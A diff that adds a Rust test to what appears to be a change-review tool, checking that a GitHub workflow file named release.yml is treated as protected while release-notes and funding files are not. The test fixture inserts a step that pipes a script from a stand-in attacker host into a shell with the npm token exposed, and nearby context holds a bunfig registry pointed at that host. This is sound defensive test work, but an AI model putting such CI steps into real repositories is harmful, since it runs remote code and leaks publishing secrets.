@@ -255,6 +255,20 @@ fn review_2_b_only_files_that_run_code_or_grant_access_need_a_look() {
 }
 
 #[test]
+fn maruhiapp_maruhi_239_and_jscraik_diagram_cli_75_a_workflow_named_release_yml_is_a_workflow_not_github_release_notes() {
+    let before = "name: release\non:\n  push:\n    branches: [main]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n";
+    let after = format!("{before}      - run: curl -sSfL https://evil.example/x | sh\n        env:\n          NODE_AUTH_TOKEN: ${{{{ secrets.NPM_TOKEN }}}}\npermissions: write-all\n");
+    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".github/workflows/release.yml", before), (".github/actions/publish/release.yml", "steps: []\n"),
+        (".github/release.yml", "changelog: {}\n"), ("packages/web/.github/FUNDING.yml", "github: [me]\n")];
+    let rules = rules_for(&base, &[(".github/workflows/release.yml", &after), (".github/actions/publish/release.yml", "steps: [run]\n"), (".github/release.yml", "changelog:\n  exclude: {}\n"),
+        ("packages/web/.github/FUNDING.yml", "github: [you]\n")], &[]);
+    assert_eq!(paths(&rules, "protected"), [".github/actions/publish/release.yml", ".github/workflows/release.yml"],
+        "GitHub reads release notes and sponsor links from a .github folder's own release.yml and FUNDING.yml; a workflow named release.yml publishes with the npm token: {}", rules["protected"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r)), (Some("look"), vec!["protected".to_string(), "protected".to_string()]), "{r}");
+}
+
+#[test]
 fn a_bunfig_toml_or_a_bun_setting_steers_what_kerns_own_bun_installs_so_a_change_to_it_needs_a_look() {
     let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), ("bun.lock", "{}\n")];
     let loud = rules_for(&base, &[("bunfig.toml", "[install]\nregistry = \"https://evil.example\"\nglobalStore = true\n"), ("packages/web/bunfig.toml", "[install]\nlinker = \"hoisted\"\n"),
